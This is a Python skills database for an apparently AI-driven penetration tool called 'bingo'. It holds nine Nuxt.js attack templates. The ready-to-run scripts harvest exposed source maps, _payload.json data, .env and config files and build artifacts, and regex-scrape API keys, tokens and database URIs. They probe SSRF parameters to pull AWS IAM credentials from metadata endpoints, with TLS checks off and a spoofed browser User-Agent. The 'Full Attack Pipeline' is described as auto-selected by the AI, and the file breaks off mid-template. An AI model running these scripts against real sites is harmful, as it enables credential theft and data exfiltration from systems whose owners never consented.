"""
skills_data13.py — Nuxt.js / Vue SPA 전용 취약점 스캔 스킬 DB
bingo v2.3.12

9 new skills:
  1. nuxt-sourcemap-leak      — /_nuxt/*.js.map 소스맵 노출 및 원본 코드 복원
  2. nuxt-payload-dump        — /_payload.json 경로 퍼징 (데이터 탈취)
  3. nuxt-env-exposure        — .env / nuxt.config.* 파일 노출
  4. nuxt-devtools-detect     — Nuxt DevTools 노출 여부
  5. nuxt-api-route-extract   — 소스맵에서 server/api/ 경로 자동 추출
  6. nuxt-aws-ssrf            — AWS App Runner 메타데이터 SSRF
  7. nuxt-build-artifact      — .output / .nuxt 빌드 아티팩트 노출
  8. nuxt-js-chunk-secrets    — JS 청크 파일 하드코딩 시크릿 스캔
  9. nuxt-full-pipeline       — Nuxt.js 전체 공격 파이프라인 자동화
"""
from __future__ import annotations

SKILLS_DB_13: dict[str, dict] = {

    # ── 1. Source Map Leak ─────────────────────────────────────────────────────
    "nuxt-sourcemap-leak": {
        "id":          "nuxt-sourcemap-leak",
        "name":        "Nuxt.js Source Map Leak",
        "name_ko":     "Nuxt.js 소스맵 노출",
        "name_zh":     "Nuxt.js源码映射泄露",
        "description": (
            "Discover exposed JavaScript source maps (*.js.map) in Nuxt.js applications. "
            "Source maps contain the original unminified source code, revealing API endpoints, "
            "hardcoded secrets, authentication logic, and internal business rules. "
            "Enumerate /_nuxt/ directory for .map files, then reconstruct source tree."
        ),
        "description_ko": (
            "Nuxt.js 앱에서 노출된 JS 소스맵(*.js.map)을 탐지한다. "
            "소스맵에는 원본 비압축 소스코드가 포함되어 있어 API 엔드포인트, "
            "하드코딩 시크릿, 인증 로직, 내부 비즈니스 규칙이 노출된다. "
            "/_nuxt/ 디렉터리에서 .map 파일을 열거하고 원본 소스 트리를 복원한다."
        ),
        "description_zh": (
            "发现Nuxt.js应用中暴露的JavaScript源码映射文件(*.js.map)。"
            "源码映射包含原始未压缩的源代码，可揭示API端点、硬编码密钥、认证逻辑。"
            "枚举/_nuxt/目录中的.map文件并重建源码树。"
        ),
        "tags": ["nuxt", "vue", "sourcemap", "recon", "spa", "javascript", "secret", "api"],
        "module": "nuxt",
        "phase": "recon",
        "severity": "high",
        "auto_trigger": ["nuxt", "vue", "spa", "sourcemap", "js.map", "/_nuxt/"],
        "code_template": '''import requests, re, json, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
session = requests.Session()
session.verify = False
session.headers.update({{
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}})

print(f"[*] Nuxt.js Source Map Scanner — {{TARGET}}")
print("=" * 60)

# Step 1: Fetch main page and extract JS chunk URLs
resp = session.get(TARGET, timeout=15)
print(f"[+] Main page: {{resp.status_code}} ({{len(resp.text)}} bytes)")

# Extract /_nuxt/ JS files
nuxt_chunks = re.findall(r'/_nuxt/([\\w\\-\\.]+\\.js)', resp.text)
nuxt_chunks = list(set(nuxt_chunks))
print(f"[+] Found {{len(nuxt_chunks)}} JS chunks in HTML")

# Also try common Nuxt entry points
common_entries = [
    "/_nuxt/entry.js", "/_nuxt/app.js", "/_nuxt/index.js",
    "/_nuxt/runtime.js", "/_nuxt/vendor.js", "/_nuxt/chunk-vendors.js",
]
for entry in common_entries:
    r = session.get(f"{{TARGET}}{{entry}}", timeout=10)
    if r.status_code == 200 and "js" in r.headers.get("content-type",""):
        maps_in = re.findall(r'[\\w\\-\\.]+\\.js', r.text[:500])
        nuxt_chunks.extend(maps_in)

nuxt_chunks = list(set(nuxt_chunks))

# Step 2: Try .map for each chunk
print("\\n[*] Probing for .map files...")
found_maps = []
for chunk in nuxt_chunks[:30]:
    map_url = f"{{TARGET}}/_nuxt/{{chunk}}.map" if not chunk.endswith(".map") else f"{{TARGET}}/_nuxt/{{chunk}}"
    r = session.get(map_url, timeout=10)
    if r.status_code == 200 and "sourceMappingURL" not in r.text and len(r.text) > 100:
        try:
            data = r.json()
            if "sources" in data or "mappings" in data:
                print(f"  [FOUND] {{map_url}} ({{len(r.text)}} bytes)")
                found_maps.append((map_url, data))
        except Exception:
            pass

# Step 3: Extract secrets from source maps
print(f"\\n[*] Analyzing {{len(found_maps)}} source maps for secrets...")
SECRET_PATTERNS = [
    (r'["\\'](sk-[a-zA-Z0-9]{{20,}})["\\'\\s]', "OpenAI API Key"),
    (r'["\\'](AKIA[A-Z0-9]{{16}})["\\'\\s]', "AWS Access Key"),
    (r'api[_\\-]?key["\\'\\s]*[:=]["\\'\\s]*([\\w\\-]{{16,}})', "API Key"),
    (r'password["\\'\\s]*[:=]["\\'\\s]*([^"\\'\\s]{{6,}})', "Password"),
    (r'secret["\\'\\s]*[:=]["\\'\\s]*([^"\\'\\s]{{8,}})', "Secret"),
    (r'token["\\'\\s]*[:=]["\\'\\s]*([\\w\\-\\.]{{20,}})', "Token"),
    (r'(https?://[\\w\\-\\.]+/api/[\\w/\\?&=]+)', "Internal API URL"),
    (r'server/api/([\\w/\\-]+)', "Nuxt Server Route"),
]

all_secrets = []
for map_url, data in found_maps:
    sources_content = ""
    if "sourcesContent" in data:
        sources_content = " ".join(str(s) for s in data["sourcesContent"] if s)
    elif "sources" in data:
        sources_content = " ".join(str(s) for s in data["sources"])
    
    for pattern, label in SECRET_PATTERNS:
        matches = re.findall(pattern, sources_content, re.IGNORECASE)
        for m in matches[:5]:
            print(f"  [{label}] {{m}} (from {{map_url}})")
            all_secrets.append({{"type": label, "value": m, "source": map_url}})

if not found_maps:
    print("  [-] No .map files exposed — source maps may be disabled in production")
else:
    print(f"\\n[SUMMARY] {{len(found_maps)}} source maps found, {{len(all_secrets)}} secrets extracted")
''',
    },

    # ── 2. _payload.json Dump ──────────────────────────────────────────────────
    "nuxt-payload-dump": {
        "id":          "nuxt-payload-dump",
        "name":        "Nuxt.js _payload.json Dump",
        "name_ko":     "Nuxt.js 페이로드 JSON 탈취",
        "name_zh":     "Nuxt.js载荷JSON转储",
        "description": (
            "Enumerate and download _payload.json files generated by Nuxt.js static generation (SSG). "
            "Each page in a Nuxt SSG build has a corresponding _payload.json containing the page's "
            "data-fetching results — potentially including user data, tokens, DB records, or admin info."
        ),
        "description_ko": (
            "Nuxt.js 정적 생성(SSG)이 만드는 _payload.json 파일을 열거·다운로드한다. "
            "SSG 빌드에서 각 페이지는 데이터 패칭 결과를 담은 _payload.json을 가진다 — "
            "사용자 데이터, 토큰, DB 레코드, 어드민 정보가 포함될 수 있다."
        ),
        "description_zh": (
            "枚举并下载Nuxt.js静态生成(SSG)生成的_payload.json文件。"
            "SSG构建中每个页面都有对应的_payload.json，包含数据获取结果，"
            "可能包含用户数据、令牌、数据库记录或管理员信息。"
        ),
        "tags": ["nuxt", "ssg", "payload", "data-leak", "recon", "spa"],
        "module": "nuxt",
        "phase": "recon",
        "severity": "high",
        "auto_trigger": ["_payload.json", "nuxt", "ssg", "static generation"],
        "code_template": '''import requests, re, json, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
session = requests.Session()
session.verify = False
session.headers.update({{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}})

print(f"[*] Nuxt.js _payload.json Enumerator — {{TARGET}}")
print("=" * 60)

# Step 1: Get page links from main page
resp = session.get(TARGET, timeout=15)
links = re.findall(r'href=["\\']([/\\w\\-]+)["\\'\\s>]', resp.text)
links = list(set(l for l in links if l.startswith("/") and "." not in l.split("/")[-1]))
print(f"[+] Found {{len(links)}} internal links")

# Add common admin/user paths
extra_paths = [
    "/admin", "/dashboard", "/user", "/profile", "/users",
    "/products", "/orders", "/settings", "/api", "/auth",
    "/login", "/register", "/account", "/data", "/config",
]
links.extend(extra_paths)
links = list(set(links))

# Step 2: Try _payload.json for each path
print(f"[*] Probing {{len(links)}} paths for _payload.json...")
found = []
for path in links:
    url = f"{{TARGET}}{{path}}/_payload.json"
    try:
        r = session.get(url, timeout=8)
        if r.status_code == 200 and r.headers.get("content-type","").startswith("application/json"):
            data = r.json()
            print(f"  [FOUND] {{url}}")
            print(f"    Keys: {{list(data.keys())[:10]}}")
            found.append({{"url": url, "data": data}})
            # Look for sensitive fields
            flat = json.dumps(data)
            if any(k in flat.lower() for k in ["password","token","secret","key","hash","admin","auth"]):
                print(f"    [!] SENSITIVE DATA detected in payload!")
                for k in ["password","token","secret","api_key","auth"]:
                    if k in flat.lower():
                        idx = flat.lower().find(k)
                        print(f"    → {{flat[max(0,idx-10):idx+60]}}")
    except Exception:
        pass

print(f"\\n[SUMMARY] {{len(found)}} _payload.json files found")
if found:
    print("[!] Review found payloads for sensitive data exposure")
''',
    },

    # ── 3. .env / Config Exposure ──────────────────────────────────────────────
    "nuxt-env-exposure": {
        "id":          "nuxt-env-exposure",
        "name":        "Nuxt.js .env / Config File Exposure",
        "name_ko":     "Nuxt.js 환경변수 파일 노출",
        "name_zh":     "Nuxt.js环境变量文件暴露",
        "description": (
            "Check for exposed .env, nuxt.config.js/ts, and other configuration files "
            "in Nuxt.js deployments that may contain database credentials, API keys, "
            "JWT secrets, and cloud provider tokens."
        ),
        "description_ko": (
            "Nuxt.js 배포에서 노출된 .env, nuxt.config.js/ts 및 기타 설정 파일을 확인한다. "
            "DB 자격증명, API 키, JWT 시크릿, 클라우드 토큰이 포함될 수 있다."
        ),
        "description_zh": (
            "检查Nuxt.js部署中暴露的.env、nuxt.config.js/ts和其他配置文件。"
            "可能包含数据库凭据、API密钥、JWT密钥和云提供商令牌。"
        ),
        "tags": ["nuxt", "env", "config", "secret", "recon"],
        "module": "nuxt",
        "phase": "recon",
        "severity": "critical",
        "auto_trigger": [".env", "nuxt.config", "environment variable"],
        "code_template": '''import requests, re, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
session = requests.Session()
session.verify = False
session.headers.update({{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}})

TARGETS = [
    "/.env", "/.env.local", "/.env.production", "/.env.development",
    "/.env.staging", "/.env.example", "/.env.backup",
    "/nuxt.config.js", "/nuxt.config.ts", "/nuxt.config.mjs",
    "/app.config.ts", "/app.config.js",
    "/.output/.env", "/.nuxt/env.json",
    "/server/.env", "/config/.env",
    "/.git/config", "/.gitignore",
    "/package.json", "/package-lock.json",
]

print(f"[*] Nuxt.js Config File Exposure Scanner — {{TARGET}}")
print("=" * 60)

SECRET_PATTERNS = [
    r'[A-Z_]{{3,}}KEY[=:]\\s*[\\w\\-./]{{8,}}',
    r'[A-Z_]{{3,}}SECRET[=:]\\s*[\\w\\-./]{{8,}}',
    r'[A-Z_]{{3,}}TOKEN[=:]\\s*[\\w\\-./]{{16,}}',
    r'DATABASE_URL[=:]\\s*\\S+',
    r'MONGODB_URI[=:]\\s*\\S+',
    r'REDIS_URL[=:]\\s*\\S+',
    r'AWS_ACCESS_KEY_ID[=:]\\s*[A-Z0-9]{{16,}}',
    r'AKIA[A-Z0-9]{{16}}',
    r'sk-[a-zA-Z0-9]{{32,}}',
]

found_files = []
for path in TARGETS:
    url = f"{{TARGET}}{{path}}"
    try:
        r = session.get(url, timeout=8)
        if r.status_code == 200 and len(r.text) > 20:
            print(f"  [EXPOSED] {{url}} ({{len(r.text)}} bytes, {{r.status_code}})")
            found_files.append(url)
            for pat in SECRET_PATTERNS:
                matches = re.findall(pat, r.text, re.IGNORECASE)
                for m in matches[:3]:
                    print(f"    [SECRET] {{m}}")
    except Exception:
        pass

print(f"\\n[SUMMARY] {{len(found_files)}} config files exposed")
''',
    },

    # ── 4. Nuxt DevTools Detect ────────────────────────────────────────────────
    "nuxt-devtools-detect": {
        "id":          "nuxt-devtools-detect",
        "name":        "Nuxt DevTools Exposure Detection",
        "name_ko":     "Nuxt DevTools 노출 탐지",
        "name_zh":     "Nuxt DevTools暴露检测",
        "description": (
            "Detect accidentally exposed Nuxt DevTools in production environments. "
            "Nuxt DevTools provides access to component inspector, route list, state viewer, "
            "and server RPC endpoints — a critical exposure if left enabled in production."
        ),
        "description_ko": (
            "운영 환경에 실수로 노출된 Nuxt DevTools를 탐지한다. "
            "DevTools는 컴포넌트 인스펙터, 라우트 목록, 상태 뷰어, "
            "서버 RPC 엔드포인트 접근을 제공 — 운영에서 활성화되면 심각한 노출이다."
        ),
        "description_zh": (
            "检测生产环境中意外暴露的Nuxt DevTools。"
            "DevTools提供组件检查器、路由列表、状态查看器和服务器RPC端点访问，"
            "若在生产环境启用则是严重暴露。"
        ),
        "tags": ["nuxt", "devtools", "debug", "recon", "misconfiguration"],
        "module": "nuxt",
        "phase": "recon",
        "severity": "high",
        "auto_trigger": ["devtools", "nuxt debug", "nuxt dev"],
        "code_template": '''import requests, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
session = requests.Session()
session.verify = False
session.headers.update({{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}})

DEVTOOLS_PATHS = [
    "/__nuxt_devtools__/client/",
    "/__nuxt_devtools__/",
    "/__nuxt__/",
    "/@nuxt/devtools/",
    "/__nuxt_devtools__/client/index.html",
    "/__nuxt_devtools__/rpc",
    "/__nuxt_devtools__/api",
    "/_nuxt_devtools_/",
]

print(f"[*] Nuxt DevTools Exposure Scanner — {{TARGET}}")
print("=" * 60)

found = []
for path in DEVTOOLS_PATHS:
    url = f"{{TARGET}}{{path}}"
    try:
        r = session.get(url, timeout=8)
        if r.status_code in (200, 301, 302) and len(r.text) > 50:
            ct = r.headers.get("content-type", "")
            if "html" in ct or "json" in ct or r.status_code in (301, 302):
                print(f"  [FOUND] {{url}} → {{r.status_code}} ({{len(r.text)}} bytes)")
                found.append(url)
                if "json" in ct:
                    print(f"    Data: {{r.text[:300]}}")
    except Exception:
        pass

if found:
    print(f"\\n[CRITICAL] Nuxt DevTools EXPOSED at {{len(found)}} endpoints!")
    print("[!] DevTools gives access to component state, routes, and RPC endpoints")
else:
    print("\\n[-] Nuxt DevTools not detected (likely disabled in production)")
''',
    },

    # ── 5. API Route Extraction from Source Maps ───────────────────────────────
    "nuxt-api-route-extract": {
        "id":          "nuxt-api-route-extract",
        "name":        "Nuxt.js API Route Extraction",
        "name_ko":     "Nuxt.js API 라우트 추출",
        "name_zh":     "Nuxt.js API路由提取",
        "description": (
            "Extract server-side API routes from Nuxt.js source maps and JS chunks. "
            "Nuxt server/api/ directory routes are compiled into JS — source map analysis "
            "can reveal hidden API endpoints that are not publicly documented."
        ),
        "description_ko": (
            "Nuxt.js 소스맵과 JS 청크에서 서버사이드 API 라우트를 추출한다. "
            "Nuxt server/api/ 디렉터리 라우트는 JS로 컴파일되며 — "
            "소스맵 분석으로 공개되지 않은 숨겨진 API 엔드포인트를 발견할 수 있다."
        ),
        "description_zh": (
            "从Nuxt.js源码映射和JS块中提取服务端API路由。"
            "Nuxt server/api/目录路由被编译进JS中，"
            "源码映射分析可以发现未公开的隐藏API端点。"
        ),
        "tags": ["nuxt", "api", "route", "recon", "endpoint-discovery"],
        "module": "nuxt",
        "phase": "recon",
        "severity": "medium",
        "auto_trigger": ["nuxt api route", "server/api", "nuxt endpoint"],
        "code_template": '''import requests, re, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
session = requests.Session()
session.verify = False
session.headers.update({{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}})

print(f"[*] Nuxt.js API Route Extractor — {{TARGET}}")
print("=" * 60)

# Gather all JS chunks
resp = session.get(TARGET, timeout=15)
chunks = re.findall(r'/_nuxt/((?:chunks?/|)[\\w\\-\\.]+\\.js)', resp.text)
chunks = list(set(chunks))
print(f"[+] Found {{len(chunks)}} JS chunks")

# Patterns that reveal API routes
ROUTE_PATTERNS = [
    r'["\\'](/api/[\\w\\-/\\[\\]]+)["\\'\\s,)]',
    r'server/api/([\\w\\-/]+\\.(?:ts|js|get|post|put|delete))',
    r'defineEventHandler.*?["\\'](/api/[\\w/\\-]+)["\\'\\s]',
    r'useFetch[^)]+["\\'](/api/[\\w/\\-\\?=]+)["\\'\\s]',
    r'\\$fetch[^)]+["\\'](/api/[\\w/\\-\\?=]+)["\\'\\s]',
    r'useAsyncData[^)]+["\\'](/api/[\\w/\\-]+)["\\'\\s]',
]

found_routes = set()
for chunk in chunks[:50]:
    url = f"{{TARGET}}/_nuxt/{{chunk}}"
    try:
        r = session.get(url, timeout=10)
        if r.status_code == 200:
            for pattern in ROUTE_PATTERNS:
                matches = re.findall(pattern, r.text)
                for m in matches:
                    if m not in found_routes:
                        found_routes.add(m)
                        print(f"  [ROUTE] {{m}}")
    except Exception:
        pass

# Probe found routes
print(f"\\n[*] Probing {{len(found_routes)}} discovered API routes...")
for route in list(found_routes)[:20]:
    url = f"{{TARGET}}{{route}}"
    try:
        r = session.get(url, timeout=8)
        status = r.status_code
        ct = r.headers.get("content-type", "")
        if status != 404:
            print(f"  {{status}} {{url}} ({{'JSON' if 'json' in ct else 'HTML'}})")
            if "json" in ct and status == 200:
                print(f"    Preview: {{r.text[:200]}}")
    except Exception:
        pass

print(f"\\n[SUMMARY] {{len(found_routes)}} API routes extracted")
''',
    },

    # ── 6. AWS App Runner SSRF ─────────────────────────────────────────────────
    "nuxt-aws-ssrf": {
        "id":          "nuxt-aws-ssrf",
        "name":        "AWS App Runner Metadata SSRF",
        "name_ko":     "AWS App Runner 메타데이터 SSRF",
        "name_zh":     "AWS App Runner元数据SSRF",
        "description": (
            "Test for Server-Side Request Forgery (SSRF) to AWS metadata endpoints in "
            "Nuxt.js apps deployed on AWS App Runner. Successful exploitation can retrieve "
            "IAM credentials, environment variables, and cloud configuration data."
        ),
        "description_ko": (
            "AWS App Runner에 배포된 Nuxt.js 앱에서 AWS 메타데이터 엔드포인트로의 "
            "SSRF를 테스트한다. 성공 시 IAM 자격증명, 환경변수, 클라우드 설정 데이터를 탈취할 수 있다."
        ),
        "description_zh": (
            "测试部署在AWS App Runner上的Nuxt.js应用中指向AWS元数据端点的SSRF。"
            "成功利用可获取IAM凭据、环境变量和云配置数据。"
        ),
        "tags": ["nuxt", "aws", "ssrf", "cloud", "metadata", "iam", "apprunner"],
        "module": "nuxt",
        "phase": "exploit",
        "severity": "critical",
        "auto_trigger": ["aws apprunner", "awsapprunner", "aws ssrf", "metadata"],
        "code_template": '''import requests, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
session = requests.Session()
session.verify = False
session.headers.update({{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}})

print(f"[*] AWS App Runner Metadata SSRF Tester — {{TARGET}}")
print("=" * 60)

# AWS metadata endpoints to probe via SSRF
METADATA_ENDPOINTS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
    "http://169.254.170.2/v2/credentials/",            # ECS Task credentials
    "http://169.254.170.23/v1/credentials",            # App Runner credentials
    "http://169.254.170.23/v1/",                       # App Runner metadata
    "http://fd00:ec2::254/latest/meta-data/",          # IPv6 metadata
]

# SSRF injection points in Nuxt apps
SSRF_PARAMS = [
    "?url=", "?redirect=", "?next=", "?path=", "?file=",
    "?src=", "?href=", "?target=", "?uri=", "?link=",
    "?callback=", "?proxy=", "?fetch=", "?load=",
]

# Try direct metadata (if server-side fetch is involved)
print("[*] Probing SSRF injection vectors...")
for param in SSRF_PARAMS:
    for meta_url in METADATA_ENDPOINTS[:3]:
        test_url = f"{{TARGET}}/api{{param}}{{meta_url}}"
        try:
            r = session.get(test_url, timeout=8)
            if r.status_code == 200 and ("ami-id" in r.text or "security-credentials" in r.text
                                          or "Token" in r.text or "AccessKeyId" in r.text):
                print(f"  [SSRF CONFIRMED] {{test_url}}")
                print(f"  Response: {{r.text[:500]}}")
        except Exception:
            pass

# Also check if target directly leaks credentials in headers/response
print("\\n[*] Checking for credential leaks in responses...")
resp = session.get(TARGET, timeout=15)
cred_indicators = ["AccessKeyId", "SecretAccessKey", "SessionToken",
                   "AWS_ACCESS_KEY", "arn:aws:", "us-east-", "ap-southeast-"]
for ind in cred_indicators:
    if ind.lower() in resp.text.lower():
        idx = resp.text.lower().find(ind.lower())
        print(f"  [LEAK] Found {{ind}} in response: {{resp.text[max(0,idx-20):idx+80]}}")

print("\\n[*] SSRF probe complete")
''',
    },

    # ── 7. Build Artifact Exposure ─────────────────────────────────────────────
    "nuxt-build-artifact": {
        "id":          "nuxt-build-artifact",
        "name":        "Nuxt.js Build Artifact Exposure",
        "name_ko":     "Nuxt.js 빌드 아티팩트 노출",
        "name_zh":     "Nuxt.js构建产物暴露",
        "description": (
            "Detect exposed Nuxt.js build artifacts including .output/, .nuxt/, "
            "dist/, and node_modules/ directories that may contain source code, "
            "configuration files, and sensitive build-time data."
        ),
        "description_ko": (
            "Nuxt.js 빌드 아티팩트 노출을 탐지한다: .output/, .nuxt/, "
            "dist/, node_modules/ 디렉터리에 소스코드, 설정 파일, 빌드 시점 민감 데이터가 포함될 수 있다."
        ),
        "description_zh": (
            "检测暴露的Nuxt.js构建产物，包括.output/、.nuxt/、dist/和node_modules/目录，"
            "可能包含源代码、配置文件和敏感的构建时数据。"
        ),
        "tags": ["nuxt", "build", "artifact", "disclosure", "recon"],
        "module": "nuxt",
        "phase": "recon",
        "severity": "high",
        "auto_trigger": ["nuxt build", ".output", ".nuxt directory", "build artifact"],
        "code_template": '''import requests, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
session = requests.Session()
session.verify = False
session.headers.update({{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}})

BUILD_PATHS = [
    "/.output/",
    "/.output/server/",
    "/.output/server/chunks/",
    "/.output/public/",
    "/.nuxt/",
    "/.nuxt/env.json",
    "/.nuxt/tsconfig.json",
    "/.nuxt/nuxt.d.ts",
    "/dist/",
    "/dist/server/",
    "/.nuxt/dist/client/",
    "/node_modules/.cache/",
    "/.cache/",
    "/build/",
]

print(f"[*] Nuxt.js Build Artifact Scanner — {{TARGET}}")
print("=" * 60)

found = []
for path in BUILD_PATHS:
    url = f"{{TARGET}}{{path}}"
    try:
        r = session.get(url, timeout=8)
        if r.status_code in (200, 403):
            print(f"  [{{r.status_code}}] {{url}} ({{len(r.text)}} bytes)")
            if r.status_code == 200 and len(r.text) > 50:
                found.append({{"url": url, "content": r.text[:500]}})
    except Exception:
        pass

print(f"\\n[SUMMARY] {{len(found)}} build artifacts accessible")
''',
    },

    # ── 8. JS Chunk Secret Scanner ─────────────────────────────────────────────
    "nuxt-js-chunk-secrets": {
        "id":          "nuxt-js-chunk-secrets",
        "name":        "Nuxt.js JS Chunk Hardcoded Secret Scanner",
        "name_ko":     "Nuxt.js JS 청크 하드코딩 시크릿 스캔",
        "name_zh":     "Nuxt.js JS块硬编码密钥扫描",
        "description": (
            "Scan all Nuxt.js JavaScript chunk files for hardcoded secrets, "
            "API keys, tokens, and credentials that developers accidentally embedded "
            "in client-side code."
        ),
        "description_ko": (
            "Nuxt.js JS 청크 파일 전체를 하드코딩 시크릿, API 키, 토큰, "
            "자격증명에 대해 스캔한다 — 개발자가 클라이언트 코드에 실수로 포함한 것들."
        ),
        "description_zh": (
            "扫描所有Nuxt.js JavaScript块文件中的硬编码密钥、API密钥、令牌和凭据，"
            "这些是开发者意外嵌入客户端代码中的敏感信息。"
        ),
        "tags": ["nuxt", "javascript", "secret", "hardcoded", "api-key", "recon"],
        "module": "nuxt",
        "phase": "recon",
        "severity": "critical",
        "auto_trigger": ["js chunk", "hardcoded secret", "nuxt secret scan"],
        "code_template": '''import requests, re, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
session = requests.Session()
session.verify = False
session.headers.update({{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}})

SECRET_PATTERNS = [
    (r'sk-[a-zA-Z0-9]{{20,}}', "OpenAI API Key"),
    (r'sk-proj-[a-zA-Z0-9_\\-]{{40,}}', "OpenAI Project Key"),
    (r'AKIA[A-Z0-9]{{16}}', "AWS Access Key ID"),
    (r'(?:ghp|gho|ghu|ghs|ghr)_[a-zA-Z0-9]{{36,}}', "GitHub Token"),
    (r'eyJ[a-zA-Z0-9_\\-]{{20,}\\.eyJ[a-zA-Z0-9_\\-]{{20,}}', "JWT Token"),
    (r'AIza[a-zA-Z0-9_\\-]{{35}}', "Google API Key"),
    (r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', "UUID/Secret"),
    (r'mongodb(?:\\+srv)?://[^\\s\\'\"]+', "MongoDB URI"),
    (r'postgres(?:ql)?://[^\\s\\'\"]+', "PostgreSQL URI"),
    (r'redis://[^\\s\\'\"]+', "Redis URI"),
    (r'(?:api|API)[-_]?(?:key|KEY)["\\']?\\s*[=:]\\s*["\\']([a-zA-Z0-9_\\-]{{16,}})["\\']', "Generic API Key"),
    (r'(?:secret|SECRET)["\\']?\\s*[=:]\\s*["\\']([a-zA-Z0-9_\\-\\.@#$%]{{8,}})["\\']', "Generic Secret"),
]

print(f"[*] Nuxt.js JS Chunk Secret Scanner — {{TARGET}}")
print("=" * 60)

resp = session.get(TARGET, timeout=15)
chunks = re.findall(r'/_nuxt/([\\w\\-\\./]+\\.js)', resp.text)
chunks = list(set(chunks))
print(f"[+] Found {{len(chunks)}} JS chunks to scan")

total_secrets = []
for chunk in chunks[:50]:
    url = f"{{TARGET}}/_nuxt/{{chunk}}"
    try:
        r = session.get(url, timeout=10)
        if r.status_code == 200:
            for pattern, label in SECRET_PATTERNS:
                matches = re.findall(pattern, r.text)
                for m in set(matches):
                    if len(m) > 8:
                        print(f"  [{label}] {{m[:60]}} ({{url.split('/')[-1]}})")
                        total_secrets.append({{"type": label, "value": m, "file": chunk}})
    except Exception:
        pass

print(f"\\n[SUMMARY] {{len(total_secrets)}} secrets found across {{len(chunks)}} JS chunks")
''',
    },

    # ── 9. Full Pipeline ───────────────────────────────────────────────────────
    "nuxt-full-pipeline": {
        "id":          "nuxt-full-pipeline",
        "name":        "Nuxt.js Full Attack Pipeline",
        "name_ko":     "Nuxt.js 전체 공격 파이프라인",
        "name_zh":     "Nuxt.js完整攻击流水线",
        "description": (
            "Automated full-scope Nuxt.js security assessment pipeline. "
            "Sequentially executes: source map discovery → JS chunk secret scan → "
            "_payload.json enumeration → .env exposure check → DevTools detection → "
            "API route extraction → AWS SSRF test. "
            "AI auto-selects this skill when target is identified as Nuxt.js/Vue SPA."
        ),
        "description_ko": (
            "Nuxt.js 전체 범위 자동 보안 평가 파이프라인. "
            "소스맵 발견 → JS 청크 시크릿 스캔 → _payload.json 열거 → "
            ".env 노출 확인 → DevTools 탐지 → API 라우트 추출 → AWS SSRF 테스트를 순차 실행. "
            "AI는 타겟이 Nuxt.js/Vue SPA로 식별될 때 자동으로 이 스킬을 선택한다."
        ),
        "description_zh": (
            "Nuxt.js全范围自动安全评估流水线。"
            "顺序执行：源码映射发现→JS块密钥扫描→_payload.json枚举→"
            ".env暴露检查→DevTools检测→API路由提取→AWS SSRF测试。"
            "当目标被识别为Nuxt.js/Vue SPA时AI自动选择此技能。"
        ),
        "tags": ["nuxt", "vue", "spa", "pipeline", "full-scan", "auto", "aws"],
        "module": "nuxt",
        "phase": "full",
        "severity": "critical",
        "auto_trigger": [
            "nuxt", "vue", "spa", "awsapprunner", "nuxtjs",
            "nuxt.js", "_nuxt/", "/_nuxt", "nuxt app",
        ],
        "code_template": '''import requests, re, json, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
session = requests.Session()
session.verify = False
session.headers.update({{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}})

print("=" * 70)
print(f"[*] Nuxt.js Full Attack Pipeline — {{TARGET}}")
print("=" * 70)

results = {{"secrets": [], "routes": [], "payloads": [], "config_files": []}}

# ── Phase 1: Fingerprint ──────────────────────────────────────────────────────
print("\\n[Phase 1] Fingerprinting...")
resp = session.get(TARGET, timeout=15)
is_nuxt = any(x in resp.text for x in ["/_nuxt/", "nuxt", "__NUXT__", "_payload.json"])
is_vue  = any(x in resp.text for x in ["vue", "Vue", "v-if", "v-for", "@click"])
print(f"  Nuxt.js: {{'YES' if is_nuxt else 'maybe'}} | Vue: {{'YES' if is_vue else 'maybe'}}")
print(f"  Status: {{resp.status_code}} | Size: {{len(resp.text)}} bytes")

# ── Phase 2: Source Maps ──────────────────────────────────────────────────────
print("\\n[Phase 2] Source Map Discovery...")
chunks = list(set(re.findall(r'/_nuxt/([\\w\\-\\./]+\\.js)', resp.text)))
SECRET_PATTERNS = [
    (r'sk-[a-zA-Z0-9]{{20,}}', "OpenAI Key"),
    (r'AKIA[A-Z0-9]{{16}}', "AWS Key"),
    (r'mongodb(?:\\+srv)?://[^\\s\\'\"]+', "MongoDB URI"),
    (r'(?:api|API)[-_]?key["\\']?\\s*[=:]\\s*["\\']([a-zA-Z0-9_\\-]{{16,}})["\\']', "API Key"),
    (r'(https?://[\\w\\-\\.]+/api/[\\w/\\?&=]{{5,}})', "Internal API URL"),
    (r'server/api/([\\w\\-/]+)', "Server Route"),
]
for chunk in chunks[:30]:
    for ext in [".map", ""]:
        url = f"{{TARGET}}/_nuxt/{{chunk}}{{ext if not chunk.endswith('.map') else ''}}"
        if not ext and not chunk.endswith(".js"):
            continue
        map_url = f"{{TARGET}}/_nuxt/{{chunk}}.map"
        try:
            r = session.get(map_url, timeout=8)
            if r.status_code == 200:
                try:
                    data = r.json()
                    content = json.dumps(data)
                    for pat, label in SECRET_PATTERNS:
                        for m in re.findall(pat, content)[:3]:
                            print(f"  [MAP SECRET] {{label}}: {{m[:60]}}")
